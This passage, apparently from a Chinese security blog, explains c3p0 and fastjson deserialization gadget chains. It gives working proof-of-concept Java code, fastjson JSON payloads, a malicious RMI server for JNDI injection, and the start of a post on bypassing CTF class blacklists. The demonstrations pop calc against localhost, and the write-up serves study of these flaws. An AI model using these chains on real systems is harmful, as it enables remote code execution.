class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> javax.naming.Referenceable;<br><span class="hljs-keyword">import</span> javax.sql.ConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> javax.sql.PooledConnection;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.SQLFeatureNotSupportedException;<br><span class="hljs-keyword">import</span> java.util.logging.Logger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">PoolBackedDataSourceBase</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PoolBackedDataSourceBase</span>(<span class="hljs-literal">false</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;connectionPoolDataSource&quot;</span>);<br>        cp.setAccessible(<span class="hljs-literal">true</span>);<br>        cp.set(base, <span class="hljs-keyword">new</span> <span class="hljs-title class_">evil</span>());<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(base);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">evil</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable&#123;<br><br>        <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:9999/&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">(String user, String password)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title function_">getLogWriter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLogWriter</span><span class="hljs-params">(PrintWriter out)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLoginTimeout</span><span class="hljs-params">(<span class="hljs-type">int</span> seconds)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLoginTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> Logger <span class="hljs-title function_">getParentLogger</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/05/C3P0/image-20240804235535113.png" alt="image-20240804235535113"></p><h4 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h4><p>PoolBackedDataSource在序列化时可以传入一个任意Reference类，在PoolBackedDataSource反序列化时该Reference类中指定的对象会被URLClassLoader远程加载实例化。</p><h3 id="hex-base-不出网利用"><a href="#hex-base-不出网利用" class="headerlink" title="hex base 不出网利用"></a>hex base 不出网利用</h3><p><code>WrapperConnectionPoolDataSourceBase#setuserOverridesAsString</code></p><p>看到set方法应该立刻联想到fastjson</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">WrapperConnectionPoolDataSourceBase是抽象类，关注其子类WrapperConnectionPoolDataSource<br></code></pre></td></tr></table></figure><p><code>setUserOverridesAsString</code>最后走到<code>C3P0ImplUtils.parseUserOverridesAsString(this.getUserOverridesAsString())</code>：</p><p><img src="/2024/08/05/C3P0/image-20240805000141646.png" alt="image-20240805000141646"></p><p>首先对<code>userOverridesAsString</code>进行截取，转为<code>byte[]</code>，再调用<code>SerializableUtils.fromByteArray(serBytes)</code>，进行反序列化操作：</p><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">getPayLoad</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;HexAsciiSerializedMap:&quot;</span> + bytesToHexString(baos.toByteArray()) + <span class="hljs-string">&quot;p&quot;</span>;<br>        <span class="hljs-type">WrapperConnectionPoolDataSource</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WrapperConnectionPoolDataSource</span>();<br>        <span class="hljs-comment">// Thread.sleep(1000*3);</span><br>        exp.setUserOverridesAsString(ser);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] toByteArray(InputStream in) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">byte</span>[] classBytes;<br>        classBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[in.available()];<br>        in.read(classBytes);<br>        in.close();<br>        <span class="hljs-keyword">return</span> classBytes;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">bytesToHexString</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bArray)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> bArray.length;<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(length);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">sTemp</span> <span class="hljs-operator">=</span> Integer.toHexString(<span class="hljs-number">255</span> &amp; bArray[i]);<br>            <span class="hljs-keyword">if</span> (sTemp.length() &lt; <span class="hljs-number">2</span>) &#123;<br>                sb.append(<span class="hljs-number">0</span>);<br>            &#125;<br><br>            sb.append(sTemp.toUpperCase());<br>        &#125;<br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>配合fastjson使用：</p><blockquote><p>{ “a”: { “@type”: “java.lang.Class”, “val”: “com.mchange.v2.c3p0.WrapperConnectionPoolDataSource” }, “b”: { “@type”: “com.mchange.v2.c3p0.WrapperConnectionPoolDataSource”, “userOverridesAsString”: “HexAsciiSerializedMap:hexEXP;” } }</p></blockquote><h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>没错，还能配JNDI。但有版本限制。</p><p>也是在fastjson或jackson环境下使用，jdk8u191以下（支持LDAP-JNDI注入）</p><ul><li><code>JndiRefConnectionPoolDataSource#setJndiName</code>最后会调用<code>JndiRefDataSourceBase#setJndiName</code>，设置<code>JndiRefDataSourceBase</code>类的jndiName属性。</li><li><code>JndiRefConnectionPoolDataSource#setLoginTimeout</code> &#x3D;&gt;<code>WrapperConnectionPoolDataSource#setLoginTimeout</code> &#x3D;&gt; <code>JndiRefForwardingDataSource#setLoginTimeout</code> &#x3D;&gt; <code>inner()</code> &#x3D;&gt; <code>dereference()</code></li></ul><p><code>JndiRefForwardingDataSource</code>继承自<code>JndiRefDataSourceBase</code>，可获取其jndiName</p><p><img src="/2024/08/05/C3P0/image-20240805000416111.png" alt="image-20240805000416111"></p><h4 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">JndiRefConnectionPoolDataSource</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JndiRefConnectionPoolDataSource</span>();<br>    exp.setJndiName(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/evil&quot;</span>);<br>    exp.setLoginTimeout(<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>RMIServer：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8080/&quot;</span>;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;calc&quot;</span>, url);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        r.bind(<span class="hljs-string">&quot;evil&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>calc.class挂web服务，<code>python -m http.server 8080</code></p><p><img src="/2024/08/05/C3P0/image-20240805000514530.png" alt="image-20240805000514530"></p><p>配合fastjson使用</p><blockquote><p>{ “a”:{ “@type”:”java.lang.Class”, “val”:”com.mchange.v2.c3p0.JndiRefForwardingDataSource” }, “b”:{ “@type”:”com.mchange.v2.c3p0.JndiRefForwardingDataSource”, “jndiName”:”rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;evil”, “loginTimeout”:0 } }</p></blockquote><p>在fastjson，jackson等环境下，调用JndiRefConnectionPoolDataSource类的jndiname，logintimeout属性setter方法，向jndiname传入恶意RMI服务器地址，然后调用logintimeout的setter方法使受害机去lookup设置好的jndiname中的恶意地址，造成JNDI注入。</p><p>参考：</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/c3p0">C3P0 | Java (gitbook.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二次反序列化</title>
    <link href="/2024/08/04/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/08/04/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>很多java题目，大都弄了个类继承<code>ObjectInputStream</code>，重写其<code>resolveClass</code>方法，在里面添加对反序列化类黑名单的校验。这也为我AWDP修java题提供了一些思路。</p><p>比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectInputStream</span> &#123;<br><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] blacklist = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<br>           <span class="hljs-string">&quot;java\\.security.*&quot;</span>, <span class="hljs-string">&quot;java\\.rmi.*&quot;</span>,  <span class="hljs-string">&quot;com\\.fasterxml.*&quot;</span>, <span class="hljs-string">&quot;com\\.ctf\\.*&quot;</span>,<br>           <span class="hljs-string">&quot;org\\.springframework.*&quot;</span>, <span class="hljs-string">&quot;org\\.yaml.*&quot;</span>, <span class="hljs-string">&quot;javax\\.management\\.remote.*&quot;</span><br>   &#125;;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyObjectInputStream</span><span class="hljs-params">(InputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>      <span class="hljs-built_in">super</span>(inputStream);<br>   &#125;<br><br>   <span class="hljs-keyword">protected</span> Class <span class="hljs-title function_">resolveClass</span><span class="hljs-params">(ObjectStreamClass cls)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>      <span class="hljs-keyword">if</span>(!contains(cls.getName())) &#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(cls);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;Unexpected serialized class&quot;</span>, cls.getName());<br>      &#125;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">contains</span><span class="hljs-params">(String targetValue)</span> &#123;<br>      <span class="hljs-keyword">for</span> (String forbiddenPackage : blacklist) &#123;<br>         <span class="hljs-keyword">if</span> (targetValue.matches(forbiddenPackage))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>      &#125;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>或这种：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyownObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectInputStream</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">ArrayList</span> <span class="hljs-variable">Blacklist</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyownObjectInputStream</span><span class="hljs-params">(InputStream in)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(in);<br>        <span class="hljs-built_in">this</span>.Blacklist.add(Hashtable.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(HashSet.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(JdbcRowSetImpl.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(TreeMap.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(HotSwappableTargetSource.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(XString.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(BadAttributeValueExpException.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(TemplatesImpl.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(ToStringBean.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(<span class="hljs-string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.Blacklist.contains(desc.getName())) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;dont do this&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这些黑名单中的类在反序列化中当然是很有用途的。</p><p>但是在比赛做题的时候就很烦了，若没有积累充足的Java反序列化利用链经验，很难绕。而且比赛时临时去找触发类也挺难的。尤其是断网的线下环境更是抽象，种种原因甚至使得web题目里Java反序列化做出来的肯定是最少的人。</p><p>Java题就变成一道类的排列组合缝合怪了🤯，想办法缝出一条可以打通的在黑名单之外的利用链。</p><p>这时候就可以考虑一下二次反序列化了，不用你定义的检测黑名单的<code>ObjectInputStream</code>去加载序列化对象，而是找到一条可以触发<code>readObject</code>的链子，用原生的<code>ObjectInputStream</code>去<code>resolveClass</code></p><h2 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h2><p>遇到过且实操过两次的好东西。</p><p>关键在于</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java.security.SignedObject#getObject<br></code></pre></td></tr></table></figure><p>这个类在<code>Hessian</code>反序列化中也用过（Hessian的会放在后面再更），由于<code>Hessian</code>反序列化的特殊性，不会执行类的<code>readObject</code>来反序列化，而是通过反射获取<code>field</code>再填充进一个空的实例化对象，<code>_tfactory</code>又是<code>transient</code>修饰，<code>writeObject</code>不会写进去，导致<code>TemplatesImpl</code>不能利用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span 